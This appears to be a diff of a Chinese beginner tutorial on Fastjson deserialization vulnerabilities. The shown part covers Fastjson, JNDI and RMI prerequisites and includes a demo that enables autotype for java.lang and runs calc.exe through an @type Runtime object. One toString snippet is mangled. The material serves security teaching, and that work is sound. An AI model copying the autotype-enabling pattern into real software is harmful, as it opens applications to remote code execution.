@@ -10,23 +10,23 @@ cve: "CVE-2017-18349"
 零、前言与目录
 =======
 
-        我在学习`Java`漏洞的时候，感觉很痛苦，不知道从何学起，因为我的`Java`基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问`chatgpt`以及问`Java`安全大牛师傅们，于是就有了这一系列的文章。 
+        我在学习`Java`漏洞的时候，感觉很痛苦，不知道从何学起，因为我的`Java`基础实在是太烂了，而且网上的关于这方面的文章，要么就给我这个初学者一种高深莫测、没多少基础就没法理解的感觉，要么就是写的实在是太过简略，没有系统性强、通俗易懂、小白友好的文章，于是我决定自己死磕，遇到不会的就去百度、谷歌、问`chatgpt`以及问`Java`安全大牛师傅们，于是就有了这一系列的文章。 
 
-        本文作为`Java`安全亲妈级零基础教程的第一篇`Fastjson`漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文一共近`18000`字，配图`108`张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究`Fastjson`的其他`payload`和`Fastjson`的不出网利用上，会在下一次更新。
+        本文作为`Java`安全亲妈级零基础教程的第一篇`Fastjson`漏洞的基础篇，从前置知识开始讲起，然后过渡到漏洞的复现和代码的分析，本文一共近`18000`字，配图`108`张，配图足够详细清除，跟着复现分析基本可以搞明白这些漏洞是怎么一回事。提高篇会重点研究`Fastjson`的其他`payload`和`Fastjson`的不出网利用上，会在下一次更新。
 
-        我在学习`Fastjson`相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不绝。在写这系列的文章的时候，我常常能进入到久违的” 心流 “状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！
+        我在学习`Fastjson`相关漏洞的时候，掌握基础之后再看师傅们的分析文章，常常不由得拍手称快，心里由衷地佩服发现这些利用链的师傅们，利用链是如此的巧妙，和开发者们之间的一攻一防真是让人觉得酣畅淋漓，精彩不绝。在写这系列的文章的时候，我常常能进入到久违的” 心流 “状态，丝毫感觉不到时间的流逝，版本之间的不同、开发者和白帽子之间对弈的场景与时间轴仿佛就呈现在我的眼前，如同过电影一般，快哉快哉！
 
-        在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。 
+        在学习的过程中，我阅读参考了数十篇师傅的文章，这些都被我列在文末，以表感谢。 
 
-        本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！ 
+        本文写作的时候，由于经常熬夜，出错之处在所难免，还望师傅们指出来，我会在下篇文章的开头感谢提出来的师傅们！ 
 
-        欢迎师傅们添加我的微信，拉交流群：
+        欢迎师傅们添加我的微信，拉交流群：
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/sXbicAlDr12ptK5iaQ3loCF8XaZJ3zTn3mYOMXysVtFkbQ8aQib1k2LWEHQScA0zhp1ZdsjXla1Rxia0PMtMPdfwHg/640?wx_fmt=jpeg)        
+![](https://mmbiz.qpic.cn/mmbiz_jpg/sXbicAlDr12ptK5iaQ3loCF8XaZJ3zTn3mYOMXysVtFkbQ8aQib1k2LWEHQScA0zhp1ZdsjXla1Rxia0PMtMPdfwHg/640?wx_fmt=jpeg)        
 
-        本文目录：
+        本文目录：
 
-零、前言与目录一、前置知识    1. fastjson 怎么用？        （1）在 IDEA 中新建一个 maven 项目，并引入 fastjson 依赖        （2）一个简单的 demo        （3）更进一步改动理解上述 demo 代码                ①问题 1：`Person person2 = JSON.parseObject(jsonString2, Person.class);`这里为什么可以直接使用`Person.class`来进行映射？                ②问题 2：为什么我初始化对象的时候，代码明明写的是`Person person = new Person("Alice", 18);`，`name`在前，`age`在后，怎么转化成`json`字符串的时候就变成了`age`在前，`name`在后了？    2. @type 是什么东西？如何反序列化带 @type 的 json 字符串？    3. JNDI 是什么东西？        （1）整一个 tomcat 容器，并在容器中配置数据源        （2）去 IDEA 里面配置 web        （3）跑 jndi 的 demo 代码，感受 jndi 的用处    4. RMI 是什么东西？        （1）通过一个 demo 快速认识 rmi 是如何调用的        （2）深入理解 rmi    5. ldap 是什么？        （1）安装并配置 ldap 服务器        （2）通过公司 - 员工管理的例子来理解 Fastjson 系列漏洞中 ldap 的作用    6. java 反射是什么？        （1）通过 demo 快速理解反射问题：我还是觉得你给出的例子体现不出灵活，怎么办？        （2）【关键！】和漏洞之间的联系？二、漏洞学习    1. fastjson<=1.2.24 反序列化漏洞（CVE-2017-18349）（学习 TemplatesImpl 链的相关知识）        （1）漏洞简单复现        （2）漏洞成因分析                ①问题 1：为什么要继承`AbstractTranslet`类？                ②为什么要这么构造`json`？    2. fastjson 1.2.25 反序列化漏洞（学习 JdbcRowSetImpl 链的相关知识）        （1）黑白名单机制介绍        （2）黑白名单绕过的复现        （3）对两种 poc 绕过手法的分析                ①第一种 poc（1.2.25-1.2.47 通杀！！！）                ②第二种 poc        （4）关于 JdbcRowSetImpl 链利用的分析    3. fastjson 1.2.42 反序列化漏洞    4. fastjson 1.2.43 反序列化漏洞    5. fastjson 1.2.44 mappings 缓存导致反序列化漏洞    6. fastjson 1.2.47 mappings 缓存导致反序列化漏洞    7.fastjson 1.2.68 反序列化漏洞四、参考与致谢
+零、前言与目录一、前置知识    1. fastjson 怎么用？        （1）在 IDEA 中新建一个 maven 项目，并引入 fastjson 依赖        （2）一个简单的 demo        （3）更进一步改动理解上述 demo 代码                ①问题 1：`Person person2 = JSON.parseObject(jsonString2, Person.class);`这里为什么可以直接使用`Person.class`来进行映射？                ②问题 2：为什么我初始化对象的时候，代码明明写的是`Person person = new Person("Alice", 18);`，`name`在前，`age`在后，怎么转化成`json`字符串的时候就变成了`age`在前，`name`在后了？    2. @type 是什么东西？如何反序列化带 @type 的 json 字符串？    3. JNDI 是什么东西？        （1）整一个 tomcat 容器，并在容器中配置数据源        （2）去 IDEA 里面配置 web        （3）跑 jndi 的 demo 代码，感受 jndi 的用处    4. RMI 是什么东西？        （1）通过一个 demo 快速认识 rmi 是如何调用的        （2）深入理解 rmi    5. ldap 是什么？        （1）安装并配置 ldap 服务器        （2）通过公司 - 员工管理的例子来理解 Fastjson 系列漏洞中 ldap 的作用    6. java 反射是什么？        （1）通过 demo 快速理解反射问题：我还是觉得你给出的例子体现不出灵活，怎么办？        （2）【关键！】和漏洞之间的联系？二、漏洞学习    1. fastjson<=1.2.24 反序列化漏洞（CVE-2017-18349）（学习 TemplatesImpl 链的相关知识）        （1）漏洞简单复现        （2）漏洞成因分析                ①问题 1：为什么要继承`AbstractTranslet`类？                ②为什么要这么构造`json`？    2. fastjson 1.2.25 反序列化漏洞（学习 JdbcRowSetImpl 链的相关知识）        （1）黑白名单机制介绍        （2）黑白名单绕过的复现        （3）对两种 poc 绕过手法的分析                ①第一种 poc（1.2.25-1.2.47 通杀！！！）                ②第二种 poc        （4）关于 JdbcRowSetImpl 链利用的分析    3. fastjson 1.2.42 反序列化漏洞    4. fastjson 1.2.43 反序列化漏洞    5. fastjson 1.2.44 mappings 缓存导致反序列化漏洞    6. fastjson 1.2.47 mappings 缓存导致反序列化漏洞    7.fastjson 1.2.68 反序列化漏洞四、参考与致谢
 
 一、前置知识
 ======
@@ -42,11 +42,11 @@ cve: "CVE-2017-18349"
 
 ```
 <dependencies>
-    <dependency>
-    <groupId>com.alibaba</groupId>
-    <artifactId>fastjson</artifactId>
-    <version>1.2.50</version>
-    </dependency>
+    <dependency>
+    <groupId>com.alibaba</groupId>
+    <artifactId>fastjson</artifactId>
+    <version>1.2.50</version>
+    </dependency>
 </dependencies>
 
 
@@ -65,41 +65,41 @@ https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.50
 ### （2）一个简单的 demo
 
 ```
-package org.example;
-import com.alibaba.fastjson.JSON;
+package org.example;
+import com.alibaba.fastjson.JSON;
 
-public class Main {
+public class Main {
 
-    public static void main(String[] args) {
-        // 将一个 Java 对象序列化为 JSON 字符串
-        Person person = new Person("Alice", 18);
-        String jsonString = JSON.toJSONString(person);
-        System.out.println(jsonString);
+    public static void main(String[] args) {
+        // 将一个 Java 对象序列化为 JSON 字符串
+        Person person = new Person("Alice", 18);
+        String jsonString = JSON.toJSONString(person);
+        System.out.println(jsonString);
 
-        // 将一个 JSON 字符串反序列化为 Java 对象
-        String jsonString2 = "{\"age\":20,\"name\":\"Bob\"}";
-        Person person2 = JSON.parseObject(jsonString2, Person.class);
-        System.out.println(person2.getName() + ", " + person2.getAge());
-    }
+        // 将一个 JSON 字符串反序列化为 Java 对象
+        String jsonString2 = "{\"age\":20,\"name\":\"Bob\"}";
+        Person person2 = JSON.parseObject(jsonString2, Person.class);
+        System.out.println(person2.getName() + ", " + person2.getAge());
+    }
 
-    // 定义一个简单的 Java 类
-    public static class Person {
-        private String name;
-        private int age;
+    // 定义一个简单的 Java 类
+    public static class Person {
+        private String name;
+        private int age;
 
-        public Person(String name, int age) {
-            this.name = name;
-            this.age = age;
-        }
+        public Person(String name, int age) {
+            this.name = name;
+            this.age = age;
+        }
 
-        public String getName() {
-            return name;
-        }
+        public String getName() {
+            return name;
+        }
 
-        public int getAge() {
-            return age;
-        }
-    }
+        public int getAge() {
+            return age;
+        }
+    }
 }
 
 
@@ -116,52 +116,52 @@ public class Main {
 在使用`fastjson`时，我们需要先将`JSON`字符串和`Java`对象之间建立映射关系，可以通过类的属性和`JSON`字段名进行映射。在我们上面的代码中，`Java`类的属性名和`JSON`字段名是相同的，因此可以直接使用`Person.class`来进行映射。**如果不同我们该怎么办？**我们可以通过使用注解来指定它们之间的映射关系。在`fastjson`中，可以使用`@JSONField`注解来指定`Java`类的属性和`JSON`字段之间的映射关系。请看以下`demo`代码：
 
 ```
-package org.example;
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.annotation.JSONField;
+package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.annotation.JSONField;
 
-public class Main {
+public class Main {
 
-    public static void main(String[] args) {
-        // 将一个 Java 对象序列化为 JSON 字符串
-        Person person = new Person("Alice", 18);
-        String jsonString = JSON.toJSONString(person);
-        System.out.println(jsonString);
+    public static void main(String[] args) {
+        // 将一个 Java 对象序列化为 JSON 字符串
+        Person person = new Person("Alice", 18);
+        String jsonString = JSON.toJSONString(person);
+        System.out.println(jsonString);
 
-        // 将一个 JSON 字符串反序列化为 Java 对象
-        String jsonString2 = "{\"user_name\":\"Bob\",\"user_age\":20}";
-        Person person2 = JSON.parseObject(jsonString2, Person.class);
-        System.out.println(person2.getName() + ", " + person2.getAge());
-    }
+        // 将一个 JSON 字符串反序列化为 Java 对象
+        String jsonString2 = "{\"user_name\":\"Bob\",\"user_age\":20}";
+        Person person2 = JSON.parseObject(jsonString2, Person.class);
+        System.out.println(person2.getName() + ", " + person2.getAge());
+    }
 
-    // 定义一个简单的 Java 类
-    public static class Person {
-        @JSONField(name = "user_name")
-        private String name;
-        @JSONField(name = "user_age")
-        private int age;
+    // 定义一个简单的 Java 类
+    public static class Person {
+        @JSONField(name = "user_name")
+        private String name;
+        @JSONField(name = "user_age")
+        private int age;
 
-        public Person(String name, int age) {
-            this.name = name;
-            this.age = age;
-        }
+        public Person(String name, int age) {
+            this.name = name;
+            this.age = age;
+        }
 
-        public String getName() {
-            return name;
-        }
+        public String getName() {
+            return name;
+        }
 
-        public void setName(String name) {
-            this.name = name;
-        }
+        public void setName(String name) {
+            this.name = name;
+        }
 
-        public int getAge() {
-            return age;
-        }
+        public int getAge() {
+            return age;
+        }
 
-        public void setAge(int age) {
-            this.age = age;
-        }
-    }
+        public void setAge(int age) {
+            this.age = age;
+        }
+    }
 }
 
 
@@ -174,51 +174,51 @@ public class Main {
 原来，在`fastjson`中，默认情况下，生成的`JSON`字符串的顺序是按照**属性的字母顺序**进行排序的，而不是按照属性在类中的声明顺序。如果我们希望按照属性在类中的声明顺序来生成`JSON`字符串，可以通过在类中使用`@JSONType`注解来设置属性的序列化顺序，请看下面的代码：
 
 ```
-package org.example;
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.annotation.JSONType;
+package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.annotation.JSONType;
 
-public class Main {
+public class Main {
 
-    public static void main(String[] args) {
-        // 将一个 Java 对象序列化为 JSON 字符串
-        Person person = new Person("Alice", 18);
-        String jsonString = JSON.toJSONString(person);
-        System.out.println(jsonString);
+    public static void main(String[] args) {
+        // 将一个 Java 对象序列化为 JSON 字符串
+        Person person = new Person("Alice", 18);
+        String jsonString = JSON.toJSONString(person);
+        System.out.println(jsonString);
 
-        // 将一个 JSON 字符串反序列化为 Java 对象
-        String jsonString2 = "{\"name\":\"Bob\",\"age\":20}";
-        Person person2 = JSON.parseObject(jsonString2, Person.class);
-        System.out.println(person2.getName() + ", " + person2.getAge());
-    }
+        // 将一个 JSON 字符串反序列化为 Java 对象
+        String jsonString2 = "{\"name\":\"Bob\",\"age\":20}";
+        Person person2 = JSON.parseObject(jsonString2, Person.class);
+        System.out.println(person2.getName() + ", " + person2.getAge());
+    }
 
-    // 定义一个简单的 Java 类
-    @JSONType(orders = {"name", "age"})
-    public static class Person {
-        private String name;
-        private int age;
+    // 定义一个简单的 Java 类
+    @JSONType(orders = {"name", "age"})
+    public static class Person {
+        private String name;
+        private int age;
 
-        public Person(String name, int age) {
-            this.name = name;
-            this.age = age;
-        }
+        public Person(String name, int age) {
+            this.name = name;
+            this.age = age;
+        }
 
-        public String getName() {
-            return name;
-        }
+        public String getName() {
+            return name;
+        }
 
-        public void setName(String name) {
-            this.name = name;
-        }
+        public void setName(String name) {
+            this.name = name;
+        }
 
-        public int getAge() {
-            return age;
-        }
+        public int getAge() {
+            return age;
+        }
 
-        public void setAge(int age) {
-            this.age = age;
-        }
-    }
+        public void setAge(int age) {
+            this.age = age;
+        }
+    }
 }
 
 
@@ -234,18 +234,18 @@ public class Main {
 我们在网上看到了很多讲`fastjson`反序列化漏洞的文章，里面都提到了`@type`，那么它到底是什么呢？`@type`是`fastjson`中的一个特殊注解，用于标识`JSON`字符串中的某个属性是一个`Java`对象的类型。具体来说，当`fastjson`从`JSON`字符串反序列化为`Java`对象时，如果`JSON`字符串中包含`@type`属性，`fastjson`会根据该属性的值来确定反序列化后的`Java`对象的类型。请看以下代码：
 
 ```
-package org.example;
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.ParserConfig;
-import java.io.IOException;
+package org.example;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+import java.io.IOException;
 
-public class Main {
-    public static void main(String[] args) throws IOException {
-        String json = "{\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\"}";
-        ParserConfig.getGlobalInstance().addAccept("java.lang");
-        Runtime runtime = (Runtime) JSON.parseObject(json, Object.class);
-        runtime.exec("calc.exe");
-    }
+public class Main {
+    public static void main(String[] args) throws IOException {
+        String json = "{\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\"}";
+        ParserConfig.getGlobalInstance().addAccept("java.lang");
+        Runtime runtime = (Runtime) JSON.parseObject(json, Object.class);
+        runtime.exec("calc.exe");
+    }
 }
 
 
@@ -254,42 +254,42 @@ public class Main {
 可以看到直接弹窗了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmbevTCtDxwibLp8KEY4V0b8G9RkSZFtgH0Qmy9PPUvE11CYlUKzWjK5w/640?wx_fmt=png)由于`fastjson`在`1.2.24`之后默认禁用 Autotype，因此这里我们通过`ParserConfig.getGlobalInstance().addAccept("java.lang");`来开启，否则会报错`autoType is not support`。我们再看这样的一个`demo`：首先是类的定义，例如我们的`Person.java`：
 
 ```
-package org.example;
+package org.example;
 
-public class Person {
-    private String name;
-    private int age;
+public class Person {
+    private String name;
+    private int age;
 
-    public Person() {}
+    public Person() {}
 
-    @Override
-    public String toString() {
-        return "Person{" +
-                " + name + '\'' +
-                ", age=" + age +
-                '}';
-    }
+    @Override
+    public String toString() {
+        return "Person{" +
+                " + name + '\'' +
+                ", age=" + age +
+                '}';
+    }
 
-    public Person(String name, int age) {
-        this.name = name;
-        this.age = age;
-    }
+    public Person(String name, int age) {
+        this.name = name;
+        this.age = age;
+    }
 
-    public String getName() {
-        return name;
-    }
+    public String getName() {
+        return name;
+    }
 
-    public void setName(String name) {
-        this.name = name;
-    }
+    public void setName(String name) {
+        this.name = name;
+    }
 
-    public int getAge() {
-        return age;
-    }
+    public int getAge() {
+        return age;
+    }
 
-    public void setAge(int age) {
-        this.age = age;
-    }
+    public void setAge(int age) {
+        this.age = age;
+    }
 }
 
 
@@ -298,19 +298,19 @@ public class Person {
 然后是`Main.java`：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.serializer.SerializerFeature;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.serializer.SerializerFeature;
 
-public class Main {
-    public static void main(String[] args) {
-        Person user = new Person();
-        user.setAge(18);
-        user.setName("xiaoming");
-        String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
-        System.out.println(s1);
-    }
+public class Main {
+    public static void main(String[] args) {
+        Person user = new Person();
+        user.setAge(18);
+        user.setName("xiaoming");
+        String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
+        System.out.println(s1);
+    }
 }
 
 
@@ -319,28 +319,28 @@ public class Main {
 输出结果为：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm9wztMTSpYibH7fb04vroxwFfiaCIfC2TkAeBS3vIWUQ3zbUwMRPPpicHQ/640?wx_fmt=png)在和前面代码做对比后，可以发现其实就是在调用`toJSONString`方法的时候，参数里面多了一个`SerializerFeature.WriteClassName`方法。传入`SerializerFeature.WriteClassName`可以使得`Fastjson`支持自省，开启自省后序列化成`JSON`的数据就会多一个`@type`，这个是代表对象类型的`JSON`文本。`FastJson`的漏洞就是他的这一个功能去产生的，在对该`JSON`数据进行反序列化的时候，会去调用指定类中对于的`get/set/is`方法， 后面会详细分析。然后我们就可以通过以下三种方式来反序列化`json`字符串了：
 
 ```
-// 方法一（返回JSONObject对象）：
-Person user = new Person();
+// 方法一（返回JSONObject对象）：
+Person user = new Person();
 user.setAge(18);
 user.setName("xiaoming");
-String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
-JSONObject jsonObject = JSON.parse(s1);
+String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
+JSONObject jsonObject = JSON.parse(s1);
 System.out.println(jsonObject);
 
-// 方法二：
-Person user = new Person();
+// 方法二：
+Person user = new Person();
 user.setAge(18);
 user.setName("xiaoming");
-String s = JSON.toJSONString(user);
-Person user1 = JSON.parseObject(s, Person.class);
+String s = JSON.toJSONString(user);
+Person user1 = JSON.parseObject(s, Person.class);
 System.out.println(user1);
 
-// 方法三：
-Person user = new Person();
+// 方法三：
+Person user = new Person();
 user.setAge(18);
 user.setName("xiaoming");
-String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
-Person user1 = JSON.parseObject(s1,Person.class);
+String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
+Person user1 = JSON.parseObject(s1,Person.class);
 System.out.println(user1);
 
 
@@ -349,7 +349,7 @@ System.out.println(user1);
 执行结果都是一样的：
 
 ```
-Person{name='xiaoming', age=18}
+Person{name='xiaoming', age=18}
 
 
 ```
@@ -364,10 +364,10 @@ Person{name='xiaoming', age=18}
 打开`[https://tomcat.apache.org/](https://tomcat.apache.org/)`，然后点击`Download`：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmibpT1BIns31R7RxHJRdfq0bqjiaXrbTqmrxFwSLvsicD0vAsibsCGgHvdg/640?wx_fmt=png)这里直接选择下载`64`位`Windows`的压缩包：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmcKWqxNZ8YFUViavVDHTxp8nya7Z3Aicp8VkuawBvLicNTq8q29z6ONM2w/640?wx_fmt=png)下载链接：https://dlcdn.apache.org/tomcat/tomcat-11/v11.0.0-M4/bin/apache-tomcat-11.0.0-M4-windows-x64.zip 解压之后，可以给改一个简洁一点的名字，例如`tomcat`，然后把`bin`目录放到环境变量中，如下图：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmB6iacJf80qJmND2ZoO37cqDFYZvibgWOxdGE2H16p3KuXHTPVUvxCBqA/640?wx_fmt=png)然后再新建一个名为`CATALINA_HOME`的路径，值为`tomcat`的根目录，例如我的：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmibYMleX8MYCYcMebhnsPn9JyegRNv5CnamfK8Wm0kUSzLsOzG6DTIfA/640?wx_fmt=png)除此之外，没有配置`JAVA_HOME`和`JRE_HOME`的也要在用户变量中配置一下，需要注意的是，我这里貌似需要安装并配置`Java17`，否则一直闪退无法启动：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmaK3XZZxgSPFhwg8G5wMhABLdTeTfrRT4zicNuLV4FqvX3nWpG6a9t9w/640?wx_fmt=png)双击`tomcat`的`bin`目录下的`startup.bat`，然后访问`[http://localhost:8080/](http://localhost:8080/)`，就可以看到服务启动成功了：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmXSKOsL21eQjLU8BhdgZecYGlkO6Uxic2LlrRibCw2p0Qo3pOjlIFWGnA/640?wx_fmt=png)然后配置`tomcat`目录下的`context.xml`（`tomcat7`及以前则是配置`server.xml`）：
 
 ```
- <Resource 
-             maxTotal="100" maxIdle="30" maxWaitMillis="10000"
-             user
-             url="jdbc:mysql://localhost:3306/security"/>
+ <Resource 
+             maxTotal="100" maxIdle="30" maxWaitMillis="10000"
+             user
+             url="jdbc:mysql://localhost:3306/security"/>
 
 
 ```
@@ -376,10 +376,10 @@ Person{name='xiaoming', age=18}
 
 ```
 <resource-ref>
-    <description>Test DB Connection</description>
-    <res-ref-name>jdbc/root</res-ref-name>
-    <res-type>javax.sql.DataSource</res-type>
-    <res-auth>Container</res-auth>
+    <description>Test DB Connection</description>
+    <res-ref-name>jdbc/root</res-ref-name>
+    <res-type>javax.sql.DataSource</res-type>
+    <res-auth>Container</res-auth>
 </resource-ref>
 
 
@@ -396,56 +396,56 @@ Person{name='xiaoming', age=18}
 然后贴上如下代码：
 
 ```
-package org.example;
+package org.example;
 
-import jakarta.servlet.ServletException;
-import jakarta.servlet.annotation.WebServlet;
-import jakarta.servlet.http.HttpServlet;
-import jakarta.servlet.http.HttpServletRequest;
-import jakarta.servlet.http.HttpServletResponse;
-import javax.naming.Context;
-import javax.naming.InitialContext;
-import javax.sql.DataSource;
-import java.io.IOException;
-import java.sql.Connection;
-import java.sql.ResultSet;
-import java.sql.Statement;
+import jakarta.servlet.ServletException;
+import jakarta.servlet.annotation.WebServlet;
+import jakarta.servlet.http.HttpServlet;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import javax.sql.DataSource;
+import java.io.IOException;
+import java.sql.Connection;
+import java.sql.ResultSet;
+import java.sql.Statement;
 
 @WebServlet("/test")
-public class Test extends HttpServlet {
+public class Test extends HttpServlet {
 
-    @Override
-    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
-        try {
-            // 获取JNDI上下文
-            Context ctx = new InitialContext();
+    @Override
+    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        try {
+            // 获取JNDI上下文
+            Context ctx = new InitialContext();
 
-            // 查找数据源
-            Context envContext = (Context) ctx.lookup("java:/comp/env");
-            DataSource ds = (DataSource) envContext.lookup("jdbc/security");
+            // 查找数据源
+            Context envContext = (Context) ctx.lookup("java:/comp/env");
+            DataSource ds = (DataSource) envContext.lookup("jdbc/security");
 
-            // 获取连接
-            Connection conn = ds.getConnection();
+            // 获取连接
+            Connection conn = ds.getConnection();
 
-            System.out.println("[+] success!");
+            System.out.println("[+] success!");
 
-            // 执行查询
-            Statement stmt = conn.createStatement();
-            ResultSet rs = stmt.executeQuery("select * from security.emails;");
+            // 执行查询
+            Statement stmt = conn.createStatement();
+            ResultSet rs = stmt.executeQuery("select * from security.emails;");
 
-            // 处理结果集
-            while (rs.next()) {
-                System.out.println(rs.getString("email_id"));
-            }
+            // 处理结果集
+            while (rs.next()) {
+                System.out.println(rs.getString("email_id"));
+            }
 
-            // 关闭连接
-            rs.close();
-            stmt.close();
-            conn.close();
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+            // 关闭连接
+            rs.close();
+            stmt.close();
+            conn.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
 }
 
 
@@ -461,19 +461,19 @@ public class Test extends HttpServlet {
 `RMI`指的是远程方法调用（`Remote Method Invocation`），是`Java`平台提供的一种机制，可以实现在不同`Java`虚拟机之间进行方法调用。这么说是真抽象，我们直接看下面使用了`RMI`的`demo`代码，包括一个服务器端和一个客户端。这个`demo`实现了一个简单的计算器程序，客户端通过`RMI`调用服务器端的方法进行加、减、乘、除四则运算。首先是一个计算器接口：
 
 ```
-package org.example;
+package org.example;
 
-import java.rmi.Remote;
-import java.rmi.RemoteException;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
 
-public interface Calculator extends Remote {
-    public int add(int a, int b) throws RemoteException;
+public interface Calculator extends Remote {
+    public int add(int a, int b) throws RemoteException;
 
-    public int subtract(int a, int b) throws RemoteException;
+    public int subtract(int a, int b) throws RemoteException;
 
-    public int multiply(int a, int b) throws RemoteException;
+    public int multiply(int a, int b) throws RemoteException;
 
-    public int divide(int a, int b) throws RemoteException;
+    public int divide(int a, int b) throws RemoteException;
 }
 
 
@@ -482,31 +482,31 @@ public interface Calculator extends Remote {
 然后是客户端代码：
 
 ```
-package org.example;
-import java.rmi.registry.LocateRegistry;
-import java.rmi.registry.Registry;
+package org.example;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
 
-public class Client {
-    private Client() {}
+public class Client {
+    private Client() {}
 
-    public static void main(String[] args) {
-        try {
-            // Get the registry
-            Registry registry = LocateRegistry.getRegistry("localhost", 1060);
+    public static void main(String[] args) {
+        try {
+            // Get the registry
+            Registry registry = LocateRegistry.getRegistry("localhost", 1060);
 
-            // Lookup the remote object "Calculator"
-            Calculator calc = (Calculator) registry.lookup("Calculator");
+            // Lookup the remote object "Calculator"
+            Calculator calc = (Calculator) registry.lookup("Calculator");
 
-            // Call the remote method
-            int result = calc.add(5, 7);
+            // Call the remote method
+            int result = calc.add(5, 7);
 
-            // Print the result
-            System.out.println("Result: " + result);
-        } catch (Exception e) {
-            System.err.println("Client exception: " + e.toString());
-            e.printStackTrace();
-        }
-    }
+            // Print the result
+            System.out.println("Result: " + result);
+        } catch (Exception e) {
+            System.err.println("Client exception: " + e.toString());
+            e.printStackTrace();
+        }
+    }
 }
 
 
@@ -515,48 +515,48 @@ public class Client {
 接着是服务端代码：
 
 ```
-package org.example;
+package org.example;
 
-import java.rmi.registry.LocateRegistry;
-import java.rmi.registry.Registry;
-import java.rmi.RemoteException;
-import java.rmi.server.UnicastRemoteObject;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
 
-public class Server extends UnicastRemoteObject implements Calculator {
-    public Server() throws RemoteException {}
+public class Server extends UnicastRemoteObject implements Calculator {
+    public Server() throws RemoteException {}
 
-    @Override
-    public int add(int x, int y) throws RemoteException {
-        return x + y;
-    }
+    @Override
+    public int add(int x, int y) throws RemoteException {
+        return x + y;
+    }
 
-    @Override
-    public int subtract(int a, int b) throws RemoteException {
-        return 0;
-    }
+    @Override
+    public int subtract(int a, int b) throws RemoteException {
+        return 0;
+    }
 
-    @Override
-    public int multiply(int a, int b) throws RemoteException {
-        return 0;
-    }
+    @Override
+    public int multiply(int a, int b) throws RemoteException {
+        return 0;
+    }
 
-    @Override
-    public int divide(int a, int b) throws RemoteException {
-        return 0;
-    }
+    @Override
+    public int divide(int a, int b) throws RemoteException {
+        return 0;
+    }
 
-    public static void main(String args[]) {
-        try {
-            Server obj = new Server();
-            LocateRegistry.createRegistry(1060);
-            Registry registry = LocateRegistry.getRegistry(1060);
-            registry.bind("Calculator", obj);
-            System.out.println("Server ready");
-        } catch (Exception e) {
-            System.err.println("Server exception: " + e.toString());
-            e.printStackTrace();
-        }
-    }
+    public static void main(String args[]) {
+        try {
+            Server obj = new Server();
+            LocateRegistry.createRegistry(1060);
+            Registry registry = LocateRegistry.getRegistry(1060);
+            registry.bind("Calculator", obj);
+            System.out.println("Server ready");
+        } catch (Exception e) {
+            System.err.println("Server exception: " + e.toString());
+            e.printStackTrace();
+        }
+    }
 }
 
 
@@ -596,19 +596,19 @@ public class Server extends UnicastRemoteObject implements Calculator {
